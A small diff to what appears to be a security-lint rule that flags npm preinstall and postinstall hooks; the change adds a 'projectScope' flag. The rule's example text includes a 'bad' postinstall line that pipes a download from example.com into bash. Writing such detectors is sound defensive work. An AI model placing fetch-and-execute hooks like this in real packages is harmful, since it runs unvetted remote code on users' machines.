@@ -24,6 +24,7 @@ const rule: Rule = {
       "preinstall/postinstall scripts run with full environment access " +
       "before the developer can inspect code. `curl | bash` chains in " +
       "these hooks are a classic supply-chain vector.",
+    projectScope: true,
     examples: {
       bad: '"postinstall": "curl -s https://example.com/setup | bash"',
       good: '"postinstall": "node ./scripts/setup.js"',
